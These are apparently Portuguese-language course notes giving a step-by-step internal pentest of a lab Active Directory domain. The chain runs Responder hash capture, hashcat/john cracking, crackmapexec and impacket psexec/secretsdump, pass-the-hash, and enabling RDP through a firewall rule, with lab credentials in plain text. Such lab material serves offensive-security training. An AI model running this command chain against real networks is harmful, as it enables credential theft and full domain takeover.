Nesse módulo é feito um Pentest interno do inicio ao fim, passa a passo:

1 Passo: 
    Mapear a rede e identificar o escopo:
    - nmap --open -v -sS -p 445 -Pn 172.16.1.0/24 -oG smb.txt -> extrai para o arquivo "targets" só os host com a porta 445 aberta
    - crackmapexec smb targets
    Após descobrir os hosts do escopo, realizar scanneamento basico neles para descobrir serviços e portas abertas
    - nmap -v --open -Pn 172.16.1.243
    - host 172.16.1.243 172.16.1.243 -> Depois é bom perguntar para o server DNS para descobrir os nomes deles e ter certeza que fazem parte do escopo
    
2 Passo:
    Depois confirar a ferramente "responder" (/etc/responder/Responder.conf, configurar o campo RespondTo) para atacar somente servidores do escopo e descobrir os hashes
    - responder -I eth0 -Prv -> O responder irá ficar escutando na interface de rede eth0 para capturar qualquer trafego na rede
    - hashcat -m 5600 hash /usr/share/wordlist/rockyou.txt --force -> para quebrar o hash encontrado dentro do arquivo
    
3 Passo:
    Validar as credenciais obtidas pelos hashes
    - smbclient -L \\172.16.1.253 -U mfernanda -W orionscorp2
    - crackmapexec smb hosts -d orionscorp2 -u mfernanda -p 'Jesus!1999' -> ele vai se conectar em todos os hots do arquivo "hosts" no domino "orionscorp2" e passando os acessos (user e senha) da fernanda
    - smbclient //172.16.1.253/ADMIN$ -U mfernanda -W orionscorp2 -> comando para se conectar manualmente no diretório passando user e senha
    - python3 /usr/share/doc/python3-impacket/examples/psexec.py orionscorp2/mfernanda:'Jesus!1999'@172.16.1.253 -> é realizado um psexec para conseguir a shell com o usuário da fernanda no host passando
    - msfconsole use exploit/windows/smb/psexec -> exploit para também conseguir uma shell usando o psexec

4 Passo:
    Enumerar mais informações do servidor AD 
    - rcpclient -W orionscorp2 -U mfernanda 172.16.1.243 -> passando o host do servidor AD para obter mais informações através do protocolo SMB
        - enumdomusers
        - getusername
        - queryuser 0x45a -> é necessário passar o RID do usuário nesse comando
        - enumdomgroups -> para saber os grupos de permissão
        - querygroup 0x200 -> passando o RID do grupo para detalhes do grupo
        - querygroupmem 0x200 -> nesse comando tbm precisa passar o RID para obter os RID dos membros do grupo
5 passo:
    Conseguir o domin ADMIN
        - impacket-secretdump orionscorp2/mfernanda:'Jesus!1999'@172.16.1.253 -> para acessar o servidor remotamente e buscar por hashes
        Modulos para captura de hashes pelo meterpreter: load mimikatz, load kiwi (ótima opção para sistemas modernos)
        hash DCC2 = hashcat -> 2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2      | Operating System
                    john -> mscash2
                    - hashcat -m 2100 [arquivo hash DCC2] /usr/share/wordlist/rockyou.txt --force
                    - hashcat -m 2100 [arquivo hash DCC2] /usr/share/wordlist/rockyou.txt --show
                    - john --format=nt --wordlist=/usr/share/wordlist/rockyou.txt [arquivo hash NTLM]
                    - john --format=nt --show [arquivo hash NTLM]
                    - smbclient -L \\172.16.1.243 -U egabriel -W orionscorp2
                    - smbclient //172.16.1.243/ADMIN$ -U egabriel -W orionscorp2 -> PARA SE CONECTAR NO SMB COM AS CREDENCIAIS DO egabriel

6 passo:
    Acessar o servidor com o domain ADMIN
        - crackmapexec smb 172.16.1.243 -u egabriel -p 'Der#22Dwr#29'
        - python3 /usr/share/doc/python3-impacket/examples/psexec.py orionscorp2/egabriel:'Der#22Dwr#29'@172.16.1.243 -> comando para fazer psexec com o usuário egabriel(admin)
        - impacket-secretdump orionscorp2/egabriel:'Der#22Dwr#29'@172.16.1.243 -> para conseguir hashes e mais informações importantes

7 passo:
    Conclusão - Acesso completo
        - python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrador@172.16.1.243 --hashes [passar o hash do servidor] -> uma forma para conseguir o acesso sem ter decoberto a senha
        - crackmapexec smb 172.16.1.243 -u egabriel -p 'Der#22Dwr#29' -L -> lista os módulos
        - crackmapexec smb 172.16.1.243 -u egabriel -p 'Der#22Dwr#29' -M rdp --options
        - crackmapexec smb 172.16.1.243 -u egabriel -p 'Der#22Dwr#29' -M rdp -o ACTION=enable
        - nmap -p 3389 -sS -Pn 172.16.1.243 -> para validar se a porta do RDP esta aberta
        - netsh advfirewall firewall add rule name="rdp" protocol=TCP dir=in localport=3389 action=allow -> para habilitar no firewall a porta RDP, mas para conseguir isso é necessário acesso ADMIN
        - xfreerdp /u:egabriel /v:172.16.1.243 -> para acessar a máquina pelo RDP

